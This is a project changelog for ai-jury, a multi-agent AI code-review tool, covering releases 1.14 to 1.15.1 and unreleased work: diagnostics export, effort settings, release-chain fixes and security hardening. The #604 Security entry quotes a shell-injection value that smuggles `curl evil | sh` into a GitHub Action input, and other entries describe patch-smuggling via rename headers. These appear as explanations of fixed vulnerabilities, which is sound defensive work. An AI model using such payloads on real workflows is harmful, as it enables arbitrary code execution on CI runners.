# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- **`jury --doctor --json`: the panel's readiness as data, and a per-agent `effort`** (#662): `--doctor` printed a human report, so a wizard or orchestrator that wanted to know *which reviewers this machine can actually run* had to scrape it. And there was no way to ask a reviewer to think harder — every vendor spells that differently, so the answer was "edit the model id yourself, per vendor".
  - `jury --doctor --json` emits exactly **one** JSON document on stdout and nothing else — `schema_version: "ai-jury.doctor.v1"`, then `tool_version`, `python`, `config_path`, `ready`, `agents[]`, `warnings[]`. Each agent carries its `transport` (`cli` / `api` / `local`), whether it is `available` and the `reason` when it is not, the `command` **or** the `endpoint` its adapter would actually call, the resolved binary, the probed version and capability labels, discovered `models`, and its effort support. `--write` is untouched and still writes the fuller internal dict; under `--json` its confirmation line moves to stderr so stdout stays parseable.
  - **The text report and the export are one projection.** `doctor.doctor_report_dict()` is pure — it runs no probes, and both renderers consume it — so the human report and the machine export cannot describe the panel differently. Pinned by a test asserting the text reflects the exported facts, and a second pinning the schema key-by-key with types, so a shape change has to be deliberate and carry a `DOCTOR_SCHEMA_VERSION` bump.
  - **Secrets stay out.** Environment *variable names* only (`OPENAI_API_KEY is not set in the environment`), never values; userinfo credentials are stripped from every endpoint. The probes are the ones doctor already ran — `models` comes from `agy models` or a local server's `/v1/models`, both time-boxed and fail-soft to `null`, because a diagnostics command must never hang or crash.
  - **`[[agent]] effort = "low"|"medium"|"high"` and `--effort` for a whole run.** The vendor mapping lives in exactly one pure function (`adapters.effort_args`): agy appends a model-id suffix (`gemini-3.8-flash` + `high` → `gemini-3.8-flash-high`, and a model that already carries one is left alone); `anthropic-api` enables extended thinking at 2048/8192/32768 tokens; `openai-api` and `openai-compatible` send `reasoning_effort`; `google-api` sends `generationConfig.thinkingConfig.thinkingBudget`. Verified against the installed `agy`, whose own `models` listing is exactly `…-high` / `…-medium` / `…-low`.
  - Anthropic's `max_tokens` is **raised above the thinking budget**. Thinking tokens are drawn from the same allowance, so leaving it at 4096 with a 32768-token budget would have produced a request the API rejects — a mapping that looks right in a unit test and fails on the first real call.
  - **`local` is deliberately not mapped**, even though it speaks OpenAI-compatible JSON: many local servers reject an unknown request field outright, which would turn an optional hint into a failed review. It warns and is ignored, like the `claude`/`codex` CLIs, which have no headless effort control at all.
  - An unsupported vendor warns **once per run** on stderr, not once per invocation — a three-round panel repeating the same line nine times is how a real warning gets scrolled past. An unknown level (`effort = "maximum"`) is a **hard config error**: silently paying for a shallower run than you asked for is the worse failure.
  - `jury init`'s interactive flow asks for a level (skippable) and records it only on agents whose vendor can act on it; every other effort-capable agent gets a commented `# effort = "medium"` hint, so the setting is discoverable from the generated file. The hint is deliberately absent under `claude`/`codex`, where uncommenting it would only ever produce a warning. The guided `--wizard` question set is unchanged.
  - Effort is part of the config hash, so two runs that differ only by effort do not share a cache entry.
  - Model discovery is opt-in (`build_diagnostics(probe_models=...)`), set only by `--json`. It is the one probe the text report never renders, and running it there cost a subprocess per agy agent and an HTTP round trip per local agent for a field nobody printed — measured 0.11 s -> 2.3 s with a single agy agent, and up to the probe timeout if the CLI hangs.
  - The Anthropic `high` budget is clamped to 27904 so `max_tokens` stays at or below 32000: per-model caps vary and the nominal 32768 plus the response allowance would build a request some models reject. The invariant `budget < max_tokens <= ceiling` is enforced at the request boundary too, so it holds for any plan.
  - An agy model id is checked against `agy models` when that listing can be discovered: a `-high` variant the CLI does not have falls back to the configured id and warns, instead of sending an unknown model and losing that reviewer's whole review. An undiscoverable listing is treated as "unknown", never as "absent".
  - **The export names an environment variable; it never carries one's value.** CodeQL (`py/clear-text-logging-sensitive-data`) traced a flow into the new `--doctor --json` print, from `[[agent]] api_key_env` — a field whose *name* matches the credential heuristic while its *value* is an env var name. The finding was a false positive about the data and a true one about the code: an operator-supplied string was being echoed verbatim into a JSON document.
    - `redaction.safe_env_var_name` now rebuilds that name character by character out of a module constant, so only `[A-Za-z_][A-Za-z0-9_]*` can reach an export or a report and nothing derived from the config field survives into one. A malformed name falls back to the vendor default — and `validate_config` warns, so the fallback is not silent.
    - The internal accessor and constant were renamed (`_api_key_env`/`_API_KEY_ENV` -> `_env_var_name`/`_ENV_VAR_NAME`): they hold public configuration, and a credential-shaped name on a non-credential is how both a reader and an analyzer misread this path. `_api_key()` **keeps** its sensitive name — it really does hold the secret, and nothing renders it. The public `[[agent]] api_key_env` config key is unchanged.
    - Fixed by construction, not by a suppression comment. Pinned by tests asserting a real credential never reaches the export, the text report, or the `--write` dict, and that a name carrying `", "injected":` or a newline cannot reshape either output.

### Fixed
- **The Website Told Visitors The Wrong Release, For Two Releases** (#646): `website/index.html` and `website/app.js` sat at v1.14.4 through 1.15.0 and 1.15.1 while the package, both plugin manifests, the README and the cookbook were all current.
  - It looked automatic. The element carries `id="site-version"` and links to `/releases/latest`, so a reader would reasonably assume it resolves the version rather than hard-coding it.
  - The release checklist asks for those two files by name. A checklist line is a request that someone remember, and for two releases nobody did — the same failure mode as the formula digest note, on a different surface.
  - Pinned by `NoUserFacingSurfaceCarriesAStaleVersion`, which checks every surface that names a version against `pyproject.toml`. Anchored on surrounding context rather than scanning for version-shaped strings: `app.js` contains numbers like `1.19.214` in its demo data, and a blanket scan would have to be weakened until it caught nothing.
- **The Last Step In The Formula Chain Was Still A Person** (#643): #638 made the release open a pull request with the digest instead of erroring about it. Opening it is not the goal — the tap only recovers when it *merges*, and until then it retries and fails roughly every half hour while the release itself is long since green.
  - The pull request is now armed to land on its own once CI has re-verified the digest against the published sdist. `main` requires status checks and no approvals, so nothing is bypassed: the wait removed is the one between "green" and "someone noticed".
  - Best-effort. With auto-merge disabled the step prints a notice and the pull request waits for a person, exactly as before.
  - Asserted separately from `gh pr create`, since the two are one line apart and deleting the second leaves a change that still reads as complete.
- **The Automatic Formula PR Could Not Push, On Its First Live Run** (#641): `git push -f origin "HEAD:${branch}"` is refused from the detached HEAD a tag build checks out. Git will not guess the remote namespace when a refspec's source is a bare commit rather than a branch — *"The destination refspec neither matches an existing ref … nor begins with refs/"* — so the branch was never created and no pull request was opened.
  - It failed in the good direction: 1.15.1 reached PyPI and the GitHub Release, the `::error::` path fired with the correct digest, and the step summary carried it. The release was not reported as broken. The tap was stale anyway, which is the outcome #638 exists to prevent.
  - Fully qualified as `HEAD:refs/heads/${branch}`, and pinned by a test asserting that any push whose source is `HEAD` names the full destination ref. The sibling repository avoids the same trap the other way, by creating a real local branch first; either is correct, pushing `HEAD:` to a bare name is not.
  - The formula digest for 1.15.1 is set here by hand, since the run that should have proposed it could not. Verified end to end against the published sdist: `AI_JURY_CHECK_EXTERNAL=1` now downloads the artifact and re-hashes it, rather than skipping.

### Documentation
- **The Homebrew release chain, written down** (#646): `docs/homebrew-release-chain.md`. Between 25 and 27 August this chain failed four separate ways and each was diagnosed from scratch, because nothing recorded how the pieces fit.
  - Covers the contradiction the whole design is arranged around (the formula's url and digest cannot both be correct at once), every guard and where it lives, what has already gone wrong and what each fix added, the two settings that still require a manual step, and a symptom-to-cause table for the next failure.
  - Linked from the README and from the release checklist, which is the *what* to this document's *why*.

## [1.15.1] - 2026-08-27

### Fixed
- **The Release Gate Blocked The Only Sequence That Could Satisfy It** (#638): the formula must name the version in `pyproject.toml` — an offline test demands it — and that version's sdist does not exist until the tag is pushed, so between the release pull request and the tag the formula's url legitimately 404s.
  - The external check turned that 404 into a failure, which made every release pull request unmergeable from the moment the check was wired into CI earlier the same day. It is also what left #637 sitting blocked for hours, looking like a broken security fix while the real cause was a version bump riding along in the same commit.
  - A 404 is now read against PyPI: if the version is not published yet the formula is ahead of it by design and the check skips, saying so. Once the version *is* published a 404 means the url names an artifact that should exist and does not — #562 — and that still fails.
  - The decision is a plain function taking a lookup, so both readings are exercised offline with a stub instead of by choosing a moment in the release cycle to run the suite. Four mutations — inverting it, pinning it true, pinning it false, and asking about the wrong version — each fail.
  - The sibling repository hit the identical bind and resolved it the same way (its #839); this follows that precedent rather than inventing a second answer.
- **git stderr Reached An Exception Unredacted** (#631): `_git_diff` had two adjacent error paths and only one redacted — the spawn failure did, the non-zero exit did not.
  - `redact()` does catch what this is aimed at: a token in a remote URL becomes `[REDACTED:github_token]`. Verified, not assumed.
  - **Raised as `[CRITICAL]`, recorded as `[LOW]`.** Only `git show` and `git diff` reach that path and both are purely local — they cannot print a URL carrying a credential; their real stderr is `fatal: ambiguous argument`. No path was demonstrated by which a secret arrives. #600/#608 is the precedent for why an overstated sentinel entry is expensive.
  - Guarded rather than left as a one-liner: a token must not survive, an ordinary `ambiguous argument` must still reach the operator **unmangled** — over-redaction is how this class of fix usually breaks — and only the first stderr line is quoted. Reverting the `redact(...)` call fails the first.
  - Reapplied from current `main`: the original branch had drifted to where its diff removed 261 lines of the day's work, including the `agy` fix.
- **The Formula Fix Could Not Reach `main`, So It Was Never Applied** (#638): the follow-up to #633 hardened the swallowed push into a loud `::error::`, which makes the failure visible but still leaves the repair to whoever reads the release log.
  - `publish.yml` now pushes the digest to a branch and opens a pull request for it — the only write to a protected `main` that can succeed. The error path remains for the case where even that push fails.
  - `tests/test_publish_formula_followup.py` pins it: no `HEAD:main`, a pull request is opened, and the job carries `pull-requests: write`. The assertions run over the step's code with comment lines removed, since the workflow's own comments describe the direct push it no longer performs.
  - The commit heading that pull request no longer carries `[skip ci]`. It was correct while the commit went straight to `main` — a formula bump needs no re-run — and fatal on a pull request, where it suppresses every workflow so the ten required checks never report and the PR can never merge. Pinned by a test; the token is invisible at the end of a long commit-message line.
  - The sibling repository takes the same route now, after failing the same week from the opposite direction: it emitted a notice with the correct digest and nobody acted on it.
- **`agy` Contributed Nothing To Any Panel** (#635): `AgyAdapter` built `agy --print` and wrote the prompt to stdin — verified against agy 1.0.6, and broken on 1.1.x where `--print` takes a value.
  - With an empty `extra_args` the run died on `flag needs an argument: -print`; with a non-empty one agy consumed the first flag as the prompt. Either way the agent passed every availability check and returned nothing, so a three-vendor panel silently became two — or one.
  - **`--doctor` could not see it.** The probe establishes that the binary exists and answers `--version`; the failure is in the argv the adapter builds, which the probe never exercises.
  - The obvious repair — put the prompt in argv — would have silently reverted #287, which moved it to stdin so the redacted diff is not readable in `ps` by any local user. That decision was recorded with an issue number in the adapter's own comment, and undoing it there would have been the worst place to do it.
  - The prompt moves to agy's own stdin channel instead: `--input-format stream-json` reads one NDJSON message per line and requires `--output-format stream-json`. `--print` is not passed at all — the input format implies print mode, and passing it would reintroduce the arity problem.
  - Verified end to end against agy **1.1.22**, not against the issue's description: the argv, the frame shape (a message without `event` is rejected outright), and the parse of the `result` event. A live run now returns `ok=True`.
  - A stream with no `result` frame falls back to the raw text rather than returning empty. An empty review is counted as an abstention, and #625 exists because an abstention read as an approval is the expensive failure.
  - Mutation-tested four ways: restoring `--print`, moving the prompt to argv, sending the bare prompt on stdin, and allowing an empty response each fail.
- **The Homebrew Tap Refused Every Sync Since 1.15.0** (#633): the formula carried 1.14.4's digest under a 1.15.0 url, so the tap guard refused to publish and `brew upgrade` could not see the release. The scheduled retry failed roughly every 30 minutes — in a different repository, hours after the release.
  - `publish.yml` computed the digest correctly, committed it, and pushed with `git push origin HEAD:main || true`. Branch protection had been added the same day (#620), so the push was rejected and the `|| true` reported success.
  - The next step's fallback — *"the tap will pick this up on its own schedule"* — is sound only if the in-repo formula is right, which the swallowed push had just failed to make it. Two silent degradations, one hard failure.
  - **The guard already existed and had never run.** `tests/test_homebrew_formula.py` has asserted the url-to-digest match all along, gated on `AI_JURY_CHECK_EXTERNAL` — a variable set nowhere in CI. The sibling repo is the mirror image: a network-enabled job and no formula test. Each had half.
  - The push now emits a loud `::error::` naming the follow-up instead of swallowing. Deliberately not a non-zero exit: PyPI and the GitHub Release have already succeeded by that point, and failing there would report a good release as broken. The hard stop is CI.
  - The formula tests run in `Action pins match upstream`, which already has network and is already a required check. That job **keeps its name**: renaming it would leave a required context that never reports, blocking every merge permanently.
  - Mutation-tested against the real mistake: restoring 1.14.4's digest fails 2 tests, pointing at a nonexistent version fails 3.

## [1.15.0] - 2026-08-25

### Added
- **`--min-vendors`: fail when the panel collapsed** (#625). `--strict` fails when a configured agent CLI is *missing*; it does not fail when one is present, probes clean, and then returns nothing — which is how a three-vendor panel silently becomes one.
  - Observed on a real run: `effective panel: 1 of 3 reviewer(s)` — `claude` failed on an expired session, `agy`'s launcher ate the prompt, `codex` reviewed alone. `jury --doctor` had reported all three `[available]` with `probe: ok` beforehand and was right; they were installed. The run still exited 0 and emitted a verdict.
  - Cross-vendor consensus is the premise, so a single-vendor run is a different thing wearing the same output — and the difference was only visible to someone who scrolled to Run metadata.
  - Counts **distinct vendors that contributed a review**, not slots: three agents from one vendor are one perspective, and an abstention is not one at all. `panel_accounting` already computed this; nothing consumed it as a gate.
  - **Opt-in (default 0), and the default is deliberately not decided.** Failing closed on a flaky vendor CLI turns a degraded second opinion into no second opinion; that trade belongs to whoever runs the panel.
  - Exits **3**, distinct from `evaluate_ci`'s 0/1, so a caller can tell "the reviewers disagreed with you" from "the reviewers never ran".
  - Tested on agents that are configured and available but return nothing — never a missing CLI, which is the case `--strict` already covers and which would pass whatever this change does. Four mutations fail: defaulting it on, dropping the flag guard, reusing exit 1, and counting reviews instead of vendors.

- **The Review-Evidence Chain Is Wired Up** (#602): of the 16 PRs merged into `main` between 2026-08-19 and 2026-08-24, none carried a review verdict — including changes to the modules `tier3_globs` already lists as highest-risk.
  - The cause was **not** the `gates: [build, lint]` line the issue pointed at: keel's own `projects/keel.yaml` declares exactly the same two. The gate is driven by a workflow, and this repo had none. Confirmed by running `keel evidence-verify` against a real PR here before writing anything — it works against the existing config unmodified, deriving a tier-2 two-reviewer requirement from `tier3_globs`.
  - `.github/workflows/keel-ship.yml` is the consumer copy of keel's own, running `keel evidence-verify --phase pre-merge --require-armed` and publishing the verdict as the `keel evidence (required)` check-run.
  - keel is installed **pinned**, and from `keel-workflow`. The PyPI name `keel` is an unrelated package at version 0.1; installing it would have given the job someone else's code and a failure that reads like a keel bug. A test asserts the package name as a rule over every install line — `keel-workflow` legitimately contains `keel`, so asserting the absence of a string would not have worked.
  - **No jury requirement**, per the issue's recommendation. keel auto-enables a *gating* jury verdict at tier-3, and this repo's jury runs against real vendor APIs; a paid run per PR is not the cost posture, and a gate nobody can afford to satisfy is one that gets waived. It drops only that verdict — tier-3 still requires three distinct reviewer verdicts. A test pins the disarm as narrow: no `--reviewers` override, no `--jury-advisory`, no blanket deferral, no `--dry-run`.
  - The gate reports but does not yet block: making the check *required* is a branch-protection change, which is an operator action. `.keel/project.yaml` now says so next to `gates:`, so the next reader does not re-derive this issue from an unexplained two-item list.
  - **Two of the first mutations against the new tests passed, and that is why the tests changed shape.** Every flag asserted on is also *described* in a comment a few lines above it, so `assertIn("--require-armed", body)` held with the flag deleted; and `assertIn("issue_comment:", body)` matched `_disabled_issue_comment:`. The assertions are now line-anchored over comment-stripped text, with a guard asserting the stripping actually strips. Seven mutations — dropping `--require-armed`, `--phase`, the trigger, the gate call, the version pin, the package name, and colliding the job name with the check name — each fail.

### Changed
- **`ruff-format` Rewrote 38 Files Under Anyone Who Installed The Hooks** (#621): `.pre-commit-config.yaml` declared `ruff-format` as a **rewriting** hook, pinned to `v0.4.4`, on a tree 35 files from formatted.
  - A contributor who installed the hooks and committed a one-line change got 38 unrelated files rewritten into it — silently, already staged by the time they looked. CI never noticed: it ran **no ruff step at all**, neither lint nor format.
  - The pin made it worse than plain drift. `v0.4.4` and current `0.16.3` format *differently* — different `ruff format --diff` output, and they disagree on five files about whether those are already formatted. The hook and any modern ruff actively undid each other.
  - Hook bumped to `0.16.3`, tree formatted, and a `Lint + format (ruff)` job added to CI so it stays true.
  - **CI's ruff is pinned to the same version as the hook**, and `tests/test_ruff_pin.py` asserts they match. The dev extra is `ruff>=0.6`, which is right for linting — new rules are worth picking up — but a format gate on a floating formatter goes red the day ruff changes its style, for reasons unrelated to the change under review.
  - **Verified at the syntax-tree level, not by the suite passing.** All 36 changed Python files parse to byte-identical trees before and after: zero semantic differences. At this size "the tests passed" is weak evidence, since most of these files have no test that would notice a changed string.
  - Mutation-tested: drifting the hook version, dropping CI's pin, and removing either ruff step each fail.

- **#600 Withdrawn: The `workspace-write` Sandbox Bypass Never Existed** (#608): shipped as `[HIGH]` security, reclassified as a docs/wording change.
  - The claim was that `_DANGEROUS_FLAGS` omitting `workspace-write` let a Codex reviewer configured with `-s workspace-write` escape all warnings and `--strict`. Measured at the fix commit and its parent, that spec produces **exactly one warning either way** — only the wording differs. `audit_agent` warns for any non-claude agent not under a *restricting* sandbox, and that catch-all had been in the file since `f5797cf` (2026-06-07), two and a half months earlier. `--strict` promotes any warning to a failure, so the configuration already failed. There was nothing to escape.
  - What #600 actually did was replace a generic "no recognized sandbox" message with one naming `workspace-write` and the powers it grants — worth doing, and not a security fix. The release history never carried the `[HIGH]`: #600 touched no changelog. The only record was `.jules/sentinel.md`, which is where the correction goes.
  - The shared error was one disjunction: all four passes read `audit_agent` as exonerating an agent when *either* it is sandboxed *or* no dangerous flag matches. Only the first is an exit; the flag list selects the message, not the verdict. **The refutation was a green test in the file they were reviewing** — `test_codex_no_sandbox_no_dangerous_flag_warns`, added alongside the catch-all. It said `assertTrue(...)`, too quiet to be read as a refutation; it now names the catch-all message, with a companion asserting that an unlisted wide sandbox warns for the same reason.
  - `docs/live-review-report.md` is annotated at all three assertions rather than edited: how four independent passes converged on the same wrong reading is the part worth keeping.

### Fixed
- **Duplicate Changelog Sections Shipped Into The Release Notes** (#627): `## [Unreleased]` carried `### Added` and `### Changed` twice each, and `## [1.0.0]` repeats `Changed` and `Fixed` in released history.
  - Nothing was lost — each entry was inserted above the previous top section, so the document grew alternating headings. `## [Unreleased]` becomes `## [x.y.z]` verbatim at release, so the duplication would have shipped to PyPI's description and the GitHub Release notes, where a reader looking for "what changed" finds two lists of the same kind.
  - Consolidated across every version block. The entry count is identical before and after (216 lines beginning `- `), which is the check that separates a merge from a deletion.
  - `tests/test_changelog_sections.py` asserts no version repeats a section, that headings come from a known vocabulary — `### Fixes` is silently a different bucket from `### Fixed` — and that `Unreleased` is non-empty, since a release cut from an empty block is blank.
  - The vocabulary is a fixed list, not one derived from the file, which would pass by construction. It covers Keep a Changelog's six plus the three this project uses (`Documentation`, `Performance`, `Internal`); the first draft omitted those and would have imposed a vocabulary the project never adopted.
  - Mutation-tested: repeating a section, misspelling `Fixed` as `Fixes`, and emptying `Unreleased` each fail.
- **A ReDoS Test That Measured Machine Load** (#614): `test_no_redos_on_long_key_like_input` asserted a 3-second wall-clock ceiling on one input size. It failed whenever the suite ran under `coverage` — which is how CI and the pre-push check run it — for reasons unrelated to the code.
  - The number it asserted on was dominated by scheduler noise, not input size: measured on a loaded machine, 200 000 characters came out *faster* than 50 000. A non-monotonic series is not measuring the thing it names.
  - It also could not catch what it claimed to. A ceiling on a single size cannot distinguish quadratic from linear-but-slow; a blowup appearing below the tested size would have passed.
  - Replaced by an assertion on the **growth ratio** across a doubling, which is what "not quadratic" actually means. `process_time` measures this process's CPU only, so load elsewhere cannot inflate it, and `min` over repeats is the right estimator for a timed body — noise only ever adds.
  - Verified in both directions, which the old test never was: it passes under `coverage` with eight CPUs deliberately saturated, and reverting the `{0,40}` bound to `*` fails it at 4.04x with a message naming the cause. Linear measures 1.7–2.2x, identical under `coverage`; the 3.0 threshold has room on both sides.
  - Sizes grow automatically until the base measurement clears the clock's real step, so a faster machine raises the input instead of going flaky. The floor is **measured, not assumed**: `get_clock_info().resolution` advertises the API's precision, and on Windows reports 1e-7 while `process_time` actually advances in 15.625 ms steps.
  - That distinction was not theoretical — the first cut of this fix used a fixed 0.005 s floor, below one Windows tick, and CI read 0.0156s → 0.0469s (one tick against three) as 3.00x quadratic growth. Reproduced locally by quantising the clock and sweeping machine speed: the fixed floor fails at 1.7x with CI's exact message and divides by a zero-quantised base at 0.5x, while the measured floor passes across 0.5x–3.0x.
  - The correctness half — a long key-like input is not an assignment — is now its own test, unaffected by timing.
- **Conflict Markers Published In The Changelog** (#615):
  - Three unresolved git conflict markers sat in `CHANGELOG.md` on `main` from #601 (2026-08-24) until now, rendered in the published changelog. No content was lost — the #606 and #607 entries were both present and correctly placed; the three lines were residue from a resolution that kept both sides and never removed the scaffolding.
  - The markers are the symptom. The defect is that nothing asserted their absence, so every CI run in between was green on a file containing `>>>>>>>`.
  - `tests/test_no_conflict_markers.py` scans the tracked set from `git ls-files` — not a hand-listed glob, so a new file type is covered the day it lands. It refuses all three markers, `=======` included: dropping the separator would let a resolution that leaves only *it* behind pass, which is the same half-finished merge.
  - Exactly seven characters, alone or followed by a space, so an eight-bracket quoted reply and an indented line are not matches — all three asserted.
  - The scan carries a vacuity floor and pins `CHANGELOG.md` as tracked: a scan that reads nothing otherwise passes for the wrong reason. Verified against the real residue, which it reports by file and line number.
- **`jury init` Offered Seven of Eleven Agents** (#606):
  - `KNOWN_AGENTS` is derived from `agent_templates()` instead of hand-listed. Four templates — `openrouter`, `deepseek`, `groq`, `aider` — shipped without ever reaching the tuple, so `--list-agents`, the wizard and `--preset all` could not see them while the unknown-agent error message named them. The CLI told users to choose from four options it never offered. #589 asked for exactly this and #590 rewrote the error message instead.
  - Adding them naively broke `jury init --preset thorough` outright: three point at real vendor hosts, and the config validator refuses a non-loopback endpoint without `JURY_ALLOW_REMOTE_ENDPOINT`, so the generated config was rejected before it could be written. They are now listed and selectable by name always, and included in an "all" preset only once the opt-in is present.
  - Both distinctions are derived from the templates rather than listed, so a new hosted template is covered the day it lands — a second hand-maintained roster is the defect this issue is about.
- **Three Error Branches Nothing Executed** (#607):
  - `patches.py`'s `Cannot read` / `Cannot write` arms and `cli.py`'s report-read arm were added by #588 and covered by no test — nothing in the repository referenced any of the three messages, and the 98% coverage floor had room for three uncovered branches.
  - #588's body said "Added regression tests in `test_cli_contract.py` and `test_patches_apply.py`". Literally true — one test in each — but between them they covered two of five new branches, and the one placed in `test_patches_apply.py` exercised `cli.py`'s `_run_apply` rather than `patches.py`, so the filename made the untested bullet above it look guarded.
  - Each branch now has a case built from a real failure shape (undecodable bytes, a read-only file), plus one asserting a refused apply leaves the file byte-identical.

### Security
- **Shell Injection via `inputs.version`** (#604):
  - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
  - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
  - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.

- **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
  - `--dry-run` prints the paths each suggestion would touch and writes nothing.
  - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
  - Applying now requires confirmation, or `--yes` for scripted use. When stdin is not a terminal and `--yes` was not passed, the command refuses rather than assuming consent — piping a report in is exactly the unattended case, and stdin may already be consumed by the report itself.
  - The `index` argument no longer defaults to `all`. A bare `jury apply --report r.md` rewrote the working tree with every suggestion in the report; it now names the range and points at `--dry-run`.
  - Independent of #603: any hand-rolled containment check is a bet that every way a patch can name a file was enumerated. This is what makes losing that bet survivable rather than silent.
  - Found while building the preview: `parse_patch_suggestions` strips the fenced block's trailing newline, and git rejects a patch body whose last line is a header rather than content. A suggestion carrying a rename or mode section could not be read at all — the preview reported "nothing git could read" for a patch that was merely missing its terminator. The body is newline-terminated for both the probe and the apply, which are now guaranteed to see identical input.
  - Every new test asserts against `git status --porcelain`, not just the exit code: the defect being fixed is precisely a command that reported one thing and wrote another.
- **Patch Containment Now Asks Git Instead Of Reading Headers** (#603): `apply_patch_suggestion` derives the set of paths a patch would touch from `git apply --numstat -z --summary --check`, and refuses unless it is exactly the suggested file.
  - The check added by #584 inspected only `--- `/`+++ ` header lines. Git carries filenames in several other constructs and honours all of them — `rename from`/`rename to`, `copy from`/`copy to`, `old mode`/`new mode`, and a `GIT binary patch` section that has no `---`/`+++` lines at all. A patch whose headers named the suggested file could rename an unrelated path and still return "Applied git patch to <file>". Reproduced against a throwaway repository.
  - It failed because it was a **blocklist**: enumerate the dangerous header forms and reject them. Adding `rename from` to the same loop repeats the design and misses the next construct. Validation and application now go through the same parser, which closes the gap rather than narrowing it.
  - `--numstat` reports a rename's destination but never its source, so a patch can remove a path no numstat record mentions. `rename` and `copy` are therefore refused as operations — a single-file suggestion has no business doing either — rather than having their paths re-derived from `--summary` prose. This is not belt-and-braces: a patch that deletes the target and then renames another file onto it is accepted by git, and numstat reports *only* the suggested file, twice. The path set matches exactly and the `--summary` line is the sole evidence the other file was destroyed.
  - **Found while fixing this, one step earlier:** the diff detection was `startswith("---") or "@@" in fix`. A rename-only or binary-only body has neither, so it never reached the git branch at all — it fell through to the line-replacement path, which wrote the diff *text* into the target file and reported success. Anything git can read as a patch now reaches the branch where containment is decided.
  - The previous test passed for the wrong reason: the secondary target did not exist in the fixture, so `git apply` failed on its own and the assertion landed on the error string — removing the guard entirely left it green. Every new fixture creates the secondary target, so the patch would otherwise apply cleanly.
  - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.

## [1.14.4] - 2026-08-19

### Fixed
- **Graceful Error Handling for Missing / Unreadable Input Files** (#587, #588): Handled `FileNotFoundError`, `IsADirectoryError`, `OSError`, and `UnicodeDecodeError` in `jury --diff-file <path>` and `jury apply --report <path>` gracefully with clean exit codes and error messages instead of raw Python tracebacks.
- **Universal Provider Template Suggestions in Config Scaffold** (#589, #590): Updated `build_config` in `src/ai_jury/scaffold.py` to list all supported universal provider templates (`openrouter`, `deepseek`, `groq`, `aider`) when an invalid agent name is provided.

## [1.14.3] - 2026-08-19

### Security
- **Patch Smuggling & Path Traversal Containment in `jury apply`** (#584): Strictly validate unified diff header paths (`--- a/...`, `+++ b/...`) against directory traversal and ensure they cannot target files outside the verified finding's targeted file.
- **GitHub Action Shell Injection Hardening** (#584): Safely pass `inputs.args` and PR metadata through environment variable indirection (`$INPUT_ARGS`) instead of inline template substitution in `action.yml`.

### Fixed
- **GenericCLIAdapter Crash on Missing CLI Executable** (#584): Fixed `AttributeError` by replacing non-existent `AgentResult.failed()` with proper `AgentResult` instantiation carrying `ERR_MISSING_CLI`.

## [1.14.2] - 2026-08-19

### Performance
- **Single-Pass Panel Accounting & Aggregations** (#574, #580): Consolidated sequential list comprehensions and `.count()` calls in `panel_accounting()` and `consensus` into explicit single-pass O(N) loops, eliminating redundant list iterations and interpreter overhead.

### Fixed
- **Homebrew Formula Dynamic PyPI Sync & Verification** (#563, #564): Resolved formula 404 and checksum mismatch by fetching PyPI's content-addressed sdist URL and SHA-256 digest at publish time. Pushed live formula to `berkayturanci/homebrew-ai-jury` tap and added unit tests (`tests/test_homebrew_formula.py`).
- **GitHub Action Marketplace Branding** (#579): Fixed action branding color in `action.yml` to conform to GitHub Marketplace color palette.
- **Website & Documentation Infrastructure** (#566, #567, #572, #573, #576, #578): Migrated canonical domain to `ai-jury.dev`, published `install.sh` to prevent 404s, added IndexNow search engine notification automation, and added native tooltips for modal close buttons.
- **CI Silent-Revert Guard Restoration** (#561): Restored release monotonicity validation job in CI.

## [1.14.1] - 2026-08-17

### Security
- **Git Apply Stderr Secret Redaction** (#555): Enforce `redact()` filtering on `git apply` standard error before surfacing patch failure diagnostics to users, preventing potential credential leakage.

### Fixed
- **CI Silent-Revert Guard Validation** (#553, #557): Run `scripts/verify_merge.py` in a dedicated CI job with `fetch-depth: 0` to accurately evaluate semver tag monotonicity and prevent stale branches from silently reverting releases.
- **Website Accessibility & Focus Indicators** (#552, #554): Added explicit `:focus-visible` styling for interactive `.int-card` elements and converted filter buttons to semantic toggle groups with `aria-pressed` state.
- **Workflow Action Pin Annotations** (#551): Corrected GitHub Action SHA comment descriptions and added a dedicated test suite (`tests/test_action_pins.py`) to prevent action pin drift.

## [1.14.0] - 2026-08-16

### Added
- **`jury apply` Command** (#521, #534, #536): Interactive patch applier that allows developers to review and safely apply verified suggested fixes generated by `--suggest-patches`. Includes path traversal containment (`_resolve_safe_path`) and dry-run safety validation.
- **Static Analysis Hint Injection (`--hints`)** (#523, #534): Automatically runs local linter / static analysis tools (ruff, eslint, flake8) and injects diagnostic hints into reviewer agent prompts to guide deliberation towards subtle defects.
- **Tiered Model Routing (`--tiered`)** (#524, #534): Cost-aware model tiering that routes small, low-risk diffs to faster/cheaper models while reserving high-capability frontier models for complex or security-sensitive diffs.
- **Semantic Diff Chunking** (#522, #534): Chunks large multi-file diffs along logical AST/function/class boundaries rather than arbitrary line counts.
- **First-Party GitHub Action** (#519, #532): Zero-friction composite GitHub Action (`uses: berkayturanci/ai-jury@v1`) for automated PR reviews, sticky PR comments, and CI merge gating.
- **Native Pre-Commit Hook** (#520, #531): Official pre-commit repository definition (`.pre-commit-hooks.yaml`) to run consensus verification before git push.
- **In-Repo Homebrew Formula & Curl Installer** (#527, #530): Dedicated Homebrew formula in `Formula/ai-jury.rb` and standalone curl installation script.
- **Interactive Integrations Showcase with Authentic Brand Assets** (#526, #529, #535, #540, #542, #544, #545, #546): 22 verified native integrations categorized into AI CLIs, Hosted APIs, Local Engines, and CI/CD tools, rendered with official brand vectors and images.

### Security
